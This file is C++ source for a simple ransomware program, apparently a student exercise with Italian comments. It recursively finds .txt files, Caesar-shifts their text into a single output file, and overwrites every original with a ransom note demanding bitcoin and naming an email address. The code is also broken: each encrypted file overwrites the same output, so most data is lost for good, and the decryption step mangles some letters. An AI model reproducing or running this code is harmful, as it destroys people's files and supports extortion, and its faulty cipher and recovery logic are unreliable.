#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <algorithm>

using namespace std;
namespace fs = std::filesystem;

int key = 3; // Key spostamento cifrario di cesare

void encryptFile(const string& filePath) {
    ifstream inputFile(filePath);
    string fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
    inputFile.close();

    //cout << "crypt file";
    
    // Cesar cipher encryption
    transform(fileContent.begin(), fileContent.end(), fileContent.begin(), [](char c) -> char {
        if (isalpha(c)) {
            char base = isupper(c) ? 'A' : 'a';
            return (c - base + key) % 26 + base;
        }
        return c;
    });

    //dichiarazione e apertura file
    ofstream outputFile("crypted.wil");
    outputFile << fileContent;
    outputFile.close();

    ofstream originalFile(filePath);
    originalFile << "Benvenuto nella famiglia CrittaCritta3AIA. Se vuoi riavere i tuoi file invia 0.001 BTC al seguente indirizzo: Fr44sWLLPZz554\n Grazie per il supporto\n stu.davide.cosentino@itstkennedy.edu.it";
    originalFile.close();
}

void findAndEncryptTxtFiles(const string& directoryPath) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
            if (fs::is_regular_file(entry) && entry.path().extension() == ".txt") {
                encryptFile(entry.path().string());
                //cout << "File .txt encrypted: " << entry.path().string() << endl;
            }
        }
    }
    catch (const exception& e) {
        cout << "Error in scan: " << e.what() << endl;
    }
}

void decryptFile(const string& directoryPath){
    try {
        for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
            if (fs::is_regular_file(entry) && entry.path().extension() == ".wil") {
                ifstream inputFile(entry.path().string());
                string fileContent((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
                inputFile.close();

                //cout << "decryption system";
                // Cesar cipher decryption
                transform(fileContent.begin(), fileContent.end(), fileContent.begin(), [](char c) -> char {
                    if (isalpha(c)) {
                        char base = isupper(c) ? 'A' : 'a';
                        return (c - base - key) % 26 + base;
                    }
                    return c;
                });

                ofstream outputFile("decrypt.txt");
                outputFile << fileContent;
                outputFile.close();
                //cout << "File decrypted " << entry.path().string() << endl;
                
                // elimina vecchio file .wil
                fs::remove(entry.path());
            }
        }
    }
    catch (const exception& e) {
        cout << "Error scan: " << e.what() << endl; // Replace std::cerr with std::cout
    }
}

int main(int argc, char* argv[])
{
    string directoryPath = "./";
    string password;

    if (argc > 1) {
        password = argv[1];
    }

    if (password == "ciao") {
        decryptFile(directoryPath);
    } else {
        findAndEncryptTxtFiles(directoryPath);
    }
    return 0;
}